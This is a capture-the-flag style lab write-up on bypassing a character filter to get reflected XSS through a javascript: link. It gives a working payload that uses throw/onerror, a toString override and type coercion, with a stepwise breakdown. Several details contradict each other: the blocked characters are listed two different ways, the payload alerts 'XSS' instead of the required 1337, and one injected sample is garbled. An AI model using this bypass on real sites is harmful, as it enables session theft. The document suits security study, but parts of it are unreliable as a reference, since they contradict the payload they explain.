---
title: 28_Lab28-Reflected XSS in a JavaScript URL with some characters blocked
date: 2026-07-09
tags:
  - 
publish: true
draft: false
description: ""
---

--- 

This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function with the string `1337` contained somewhere in the `alert` message.

---


### Lab Context

The vulnerable page reflects your input into a `javascript:` URI inside an anchor tag:

```html
<a href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=4&USER_INPUT'}).finally(_=>window.location='/')">Back to Blog</a>
```

---

### Characters Blocked

```
"   `   (   )
```


---

### The Payload

```
&'},x=x=>{throw/**/onerror=alert,'XSS'},toString=x,window+'',{x:'
```

---

### How the Payload Works — Complete Breakdown

#### Step 1 — Breaking Out of the fetch() Body String

```javascript
// Before injection:
fetch('/analytics',{method:'post',body:'/post?postId=4&USER_INPUT'})

// After injection:
fetch('/analytics',{method:'post',body:'/post?postId=4&'})
//                                                      ↑
//                          &  → ends URL parameter
//                          '  → closes the body string
//                          }  → closes the options object
//                          ,  → comma operator chains next expression
```

Everything after this point runs as **independent JavaScript expressions** chained by the comma operator.

---

#### Step 2 — Defining the Attack Function

```javascript
x=x=>{throw/**/onerror=alert,'XSS'}
```

Assigns an arrow function to `x`. When called, it executes:

```javascript
throw onerror=alert, 'XSS'
//    ─────────────  ─────
//    Step A         Step B
```

**Comma operator** evaluates left to right:

- Step A: `onerror=alert` — sets `window.onerror` to the `alert` function
- Step B: `throw 'XSS'` — throws `'XSS'` as an uncaught error
- Uncaught throw triggers `window.onerror`
- `window.onerror('XSS')` → `alert('XSS')` ✅

`/**/` is a comment used as whitespace substitute in case spaces are stripped.

---

#### Step 3 — Overriding toString

```javascript
toString=x
```

`toString` without an object prefix refers to `window.toString`. This replaces the native `window.toString()` with function `x`.

---

#### Step 4 — Triggering the Chain

```javascript
window+''
```

The `+` operator with `''` forces **type coercion** — JavaScript must convert `window` to a string:

```
window + ''
    ↓
calls window.toString()
    ↓
toString was replaced with x
    ↓
x() executes
    ↓
throw onerror=alert, 'XSS'
    ↓
onerror = alert    (Step A — assignment)
    ↓
throw 'XSS'        (Step B — throws)
    ↓
window.onerror fires
    ↓
alert('XSS') ✅
```

---

#### Step 5 — Closing Syntax Cleanly

```javascript
,{x:'
```

The trailing `{x:'` opens an object with a property `x` whose string value is closed by the raw `'` that already exists in the original `fetch()` call — keeping the surrounding JavaScript syntax valid.

---

### URL Encoding — Why %27 Still Executes as `'`

This is a two-stage parsing process:

```
Stage 1 — HTML parser reads href attribute:
  Sees %27 as literal URL-encoded text
  Does NOT decode it
  Passes raw string to next stage

Stage 2 — javascript: URI handler:
  Browser performs URL decoding BEFORE handing to JS engine
  %27 → '
  %3d → =
  %3f → ?
  %26 → &

Stage 3 — JavaScript engine executes:
  Receives fully decoded string
  Sees real ' characters
  Payload executes ✅
```

```
What HTML parser sees:   %27  (safe, no special meaning)
What JS engine receives: '    (real character, executes as JS syntax)
```

URL encoding serves as **safe transport through the HTML layer** — the characters are restored exactly when needed for JavaScript execution.

---

### Why Each Blocked Character Was Worked Around

|Blocked|Why needed|Workaround|
|---|---|---|
|`'` `"` `` ` ``|String delimiters for `alert('XSS')`|`throw` with comma operator passes value without new string|
|`(` `)`|Function call syntax `alert()`|`onerror=alert` + `throw` calls alert implicitly|
|`,`|Chain expressions|Comma operator inside `throw` expression + existing commas in `fetch()` argument list|

---

### Core Concepts This Lab Teaches

**1. Comma operator chains expressions without statements:**

```javascript
a, b, c    // a runs, b runs, c runs — all in one expression
```

**2. `throw` + `onerror` calls functions without parentheses:**

```javascript
onerror=alert   // set handler
throw 'XSS'     // trigger it
// alert('XSS') fires without ever writing alert()
```

**3. Type coercion triggers function calls without parentheses:**

```javascript
toString = x    // override toString
window + ''     // forces toString() → calls x() without ()
```

**4. URL decoding happens between HTML parsing and JS execution:**

```javascript
%27 in href → ' when javascript: URI executes
// encode for HTML safety, decode for JS execution
```

---

### The Complete Execution Chain in One Diagram

```
User clicks link
      ↓
Browser URL-decodes the javascript: URI
      ↓
%27→' %3d→= %3f→? (all restored)
      ↓
JS engine receives decoded string
      ↓
fetch('/analytics',{body:'/post?postId=4&'})  ← closes cleanly
      ↓
comma operator chains:
  x = x=>{throw/**/onerror=alert,'XSS'}       ← function defined
  toString = x                                 ← toString overridden
  window+''                                    ← coercion triggered
      ↓
window.toString() called → x() runs
      ↓
onerror = alert  (comma operator step 1)
throw 'XSS'      (comma operator step 2)
      ↓
window.onerror('XSS') fires
      ↓
alert('XSS') ✅
```




---

#### Normal user search result: 

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>
```

#### URL Decoded 

```js
fetch('/analytics', {method:'post',body:'/post?postId=1'}).finally(_ => window.location = '/')
```

#### Payload lands in : 

```js
fetch('/analytics', {method:'post',body:'/post?postId=1&'},throw/**/onerror=alert,1001,{%27'}).finally(_ => window.location = '/')
```

#### URL Decoded : 

```js
fetch('/analytics', {method: 'post', body: '/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
```

### Payload; 

```js
&'},x=x=>{throw/**/onerror=alert,'XSS'},toString=x,window+'',{x:'
```

```js
fetch('/analytics', {method:'post',body:'/post?postId=3&'},x=x=>{throw/**/onerror=alert,'XSS'},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
```

```html
<a href="[javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26%27},x%3dx%3d%3e{throw/**/onerror%3dalert,%27XSS%27},toString%3dx,window+%27%27,{x%3a%27'}).finally(_ => window.location = '/')](about:blank)">Back to Blog</a>
```




---

